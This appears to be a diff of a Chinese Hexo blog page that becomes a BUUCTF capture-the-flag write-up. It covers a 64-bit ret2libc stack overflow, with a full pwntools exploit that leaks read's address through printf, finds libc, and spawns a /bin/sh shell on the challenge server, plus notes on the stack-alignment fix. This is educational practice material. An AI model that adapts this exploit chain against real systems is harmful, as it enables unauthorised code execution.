@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>常见pwn类赛题 |  屿</title>
+      <title>64位ret2libc_用printf泄露read实际地址 |  屿</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -66,7 +66,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-常见pwn类赛题"
+  id="post-64位ret2libc_用printf泄露read实际地址"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -77,7 +77,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  常见pwn类赛题
+  64位ret2libc_用printf泄露read实际地址
 </h1>
  
 
@@ -85,15 +85,19 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/09/18/%E5%B8%B8%E8%A7%81pwn%E7%B1%BB%E8%B5%9B%E9%A2%98/" class="article-date">
-  <time datetime="2021-09-18T12:27:25.000Z" itemprop="datePublished">2021-09-18</time>
-</a>   
+      <a href="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/" class="article-date">
+  <time datetime="2021-09-22T14:13:41.993Z" itemprop="datePublished">2021-09-22</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/buuctf/">buuctf</a>
+  </div>
+  
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">173</span>
+            <span class="post-count">538</span>
         </span>
     </span>
 
@@ -102,30 +106,53 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
  
     </div>
       
-    <div class="tocbot"></div>
-
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="常见的PWN类赛题有以下几种。"><a href="#常见的PWN类赛题有以下几种。" class="headerlink" title="常见的PWN类赛题有以下几种。"></a>常见的PWN类赛题有以下几种。</h2><ul>
-<li>Windows。</li>
-<li>Python。</li>
-<li>Linux：包括stack、ret2plt、ret2libc、heap、fastbin、unlink、use after free。</li>
-<li>其它：包括格式化字符串、整数输出。</li>
+  <p>64位程序，ret2libc类题目，用printf泄露read实际地址</p>
+<p>checksec：</p>
+<p><img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922222156215.png" alt="image-20210922222156215"></p>
+<p>ida：</p>
+<p>伪代码</p>
+<p><img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922222623857.png" alt="image-20210922222623857"></p>
+<p>main函数</p>
+<p><img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922222536787.png" alt="image-20210922222536787"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#printf()	参数如下:①format（%s格式化字符串地址）②打印内容 ③打印字符数目</span></span><br><span class="line"><span class="comment">#64位ret2libc使用printf泄露read实际地址</span></span><br><span class="line"><span class="comment">#打远程时不会出错，打本地时会出错。</span></span><br><span class="line"><span class="comment">#2021.9.22解决，将main地址</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29119</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn28&#x27;)</span></span><br><span class="line">ret = <span class="number">0x4004d1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400731</span></span><br><span class="line">format_addr = <span class="number">0x0000000000400770</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn28&#x27;</span>)</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]	<span class="comment">#0x400636 这个地址远程可以用，但本地不行。</span></span><br><span class="line">main = <span class="number">0x400637</span>				<span class="comment">#这个地址远程本地都能用。</span></span><br><span class="line">read_got =elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;What&#x27;s your name? &quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(format_addr)+p64(pop_rsi_r15_ret)+p64(read_got)+p64(<span class="number">1</span>)+p64(printf_plt)+p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#read_addr = u64(io.recv(8))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;this:&#x27;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;____this:&#x27;</span>+<span class="built_in">hex</span>(main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libcbase = read_addr -libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>
+
+<p><strong>遇到的问题：</strong></p>
+<ul>
+<li>在使用elf获取main函数的地址时，获取到的地址是0x400636这个地址在打远程时可以使用，但是在打本地时出现返回不到main函数的情况。</li>
 </ul>
-<hr>
-<h6 id="下面做一个题型展示，以及一些注意点（学会了再补充），以供日后忘记时回忆。"><a href="#下面做一个题型展示，以及一些注意点（学会了再补充），以供日后忘记时回忆。" class="headerlink" title="下面做一个题型展示，以及一些注意点（学会了再补充），以供日后忘记时回忆。"></a><em>下面做一个题型展示，以及一些注意点（学会了再补充），以供日后忘记时回忆。</em></h6><h6 id="有时间把做过的题补充上。"><a href="#有时间把做过的题补充上。" class="headerlink" title="有时间把做过的题补充上。"></a><em>有时间把做过的题补充上。</em></h6><h6 id="其它缺陷慢慢补吧。。。"><a href="#其它缺陷慢慢补吧。。。" class="headerlink" title="其它缺陷慢慢补吧。。。"></a><em>其它缺陷慢慢补吧。。。</em></h6><hr>
-<h2 id="Windows-PWN"><a href="#Windows-PWN" class="headerlink" title="Windows PWN"></a>Windows PWN</h2><h6 id="1-FTP协议栈溢出漏洞"><a href="#1-FTP协议栈溢出漏洞" class="headerlink" title="1. FTP协议栈溢出漏洞"></a>1. FTP协议栈溢出漏洞</h6><h2 id="Linux-PWN"><a href="#Linux-PWN" class="headerlink" title="Linux PWN"></a>Linux PWN</h2><h6 id="1-静态编译软件栈溢出漏洞"><a href="#1-静态编译软件栈溢出漏洞" class="headerlink" title="1.静态编译软件栈溢出漏洞"></a>1.静态编译软件栈溢出漏洞</h6><h6 id="2-ret2libc栈溢出漏洞"><a href="#2-ret2libc栈溢出漏洞" class="headerlink" title="2.ret2libc栈溢出漏洞"></a>2.ret2libc栈溢出漏洞</h6><h6 id="3-构造浮点型Shellcode"><a href="#3-构造浮点型Shellcode" class="headerlink" title="3.构造浮点型Shellcode"></a>3.构造浮点型Shellcode</h6><h6 id="4-Linux栈溢出漏洞"><a href="#4-Linux栈溢出漏洞" class="headerlink" title="4.Linux栈溢出漏洞"></a>4.Linux栈溢出漏洞</h6><h6 id="5-ret2plt栈溢出漏洞"><a href="#5-ret2plt栈溢出漏洞" class="headerlink" title="5.ret2plt栈溢出漏洞"></a>5.ret2plt栈溢出漏洞</h6><h6 id="6-unlink堆溢出漏洞"><a href="#6-unlink堆溢出漏洞" class="headerlink" title="6.unlink堆溢出漏洞"></a>6.unlink堆溢出漏洞</h6><h6 id="7-UAF堆溢出漏洞"><a href="#7-UAF堆溢出漏洞" class="headerlink" title="7.UAF堆溢出漏洞"></a>7.UAF堆溢出漏洞</h6><h6 id="8-格式化字符串漏洞"><a href="#8-格式化字符串漏洞" class="headerlink" title="8.格式化字符串漏洞"></a>8.格式化字符串漏洞</h6><h6 id="9-整数溢出"><a href="#9-整数溢出" class="headerlink" title="9.整数溢出"></a>9.整数溢出</h6><h6 id="10-Linux随机数"><a href="#10-Linux随机数" class="headerlink" title="10.Linux随机数"></a>10.Linux随机数</h6><h2 id="Python-PWN"><a href="#Python-PWN" class="headerlink" title="Python PWN"></a>Python PWN</h2><h6 id="1-Python沙盒绕过"><a href="#1-Python沙盒绕过" class="headerlink" title="1.Python沙盒绕过"></a>1.Python沙盒绕过</h6> 
+<p><strong>解决方法及思路：</strong></p>
+<ul>
+<li><p>本机libc版本：<img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922223533015.png" alt="image-20210922223533015"></p>
+<p>远程libc版本：<img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922223701204.png" alt="image-20210922223701204"></p>
+</li>
+<li><p>从上面可以看到，我的libc版本是2.31的，而靶机的libc版本是2.23的，这样就导致了一个问题。</p>
+<p>==<strong>当glibc版本大于2.27的时，系统调用system(“/bin/sh”)之前有个xmm寄存器使用。要确保rsp是与16对齐的，也就是末尾必须是0.</strong>==</p>
+</li>
+<li><p>下面摘抄一段：<img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922224515487.png" alt="image-20210922224515487"><img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922224338013.png" alt="image-20210922224338013"></p>
+</li>
+<li><p>就是说这边的0x40036这个地址不能用了，他没有被16字节整除。这样的话，不执行push，转而使用0x400637这个地址就解决了。<img src="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/image-20210922223956307.png" alt="image-20210922223956307"></p>
+</li>
+</ul>
+<p><strong>注意点：</strong></p>
+<ul>
+<li>printf()参数如下:①format（%s格式化字符串地址）②打印内容 ③打印字符数目。</li>
+</ul>
+<p><strong>参考链接</strong>：<a target="_blank" rel="noopener" href="https://blog.csdn.net/fjh1997/article/details/107695261">关于jarvisOJ level0远程打得通本地打不通的问题_fjh1997的博客-CSDN博客</a></p>
+ 
       <!-- reward -->
       
       <div id="reword-out">
@@ -195,12 +222,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://iy30.github.io/2021/09/18/%E5%B8%B8%E8%A7%81pwn%E7%B1%BB%E8%B5%9B%E9%A2%98/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://iy30.github.io/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%B5%9B%E9%A2%98/" rel="tag">赛题</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2libc/" rel="tag">ret2libc</a></li></ul>
 
     </footer>
   </div>
@@ -208,19 +235,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/09/22/64%E4%BD%8Dret2libc_%E7%94%A8printf%E6%B3%84%E9%9C%B2read%E5%AE%9E%E9%99%85%E5%9C%B0%E5%9D%80/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            64位ret2libc_用printf泄露read实际地址
-          
-        </div>
-      </a>
     
-    
-      <a href="/2021/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_pwn/" class="article-nav-link">
+      <a href="/2021/09/18/%E5%B8%B8%E8%A7%81pwn%E7%B1%BB%E8%B5%9B%E9%A2%98/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">攻防世界_pwn</div>
+        <div class="article-nav-title">常见pwn类赛题</div>
       </a>
     
   </nav>
